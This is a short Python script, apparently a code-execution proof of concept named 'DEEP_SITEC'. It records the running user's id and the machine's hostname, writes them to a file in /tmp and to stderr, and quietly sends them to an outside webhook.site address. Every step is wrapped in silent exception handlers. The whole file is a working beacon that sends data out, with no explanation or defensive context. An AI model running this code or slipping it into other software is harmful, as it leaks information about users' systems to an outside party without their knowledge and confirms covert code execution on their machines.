import os,socket,sys,urllib.request
u=str(os.getuid())
h=socket.gethostname()
m="DEEP_SITEC_EXEC uid="+u+" host="+h
try:
 open("/tmp/DEEP_SITEC_9001.txt","w").write(m)
except Exception: pass
try:
 sys.stderr.write(m+"\n");sys.stderr.flush()
except Exception: pass
try:
 urllib.request.urlopen("https://webhook.site/8101bf0d-949b-4e8f-af0a-afc83184a0e6/SITEC?u="+u+"&h="+h,timeout=5)
except Exception: pass
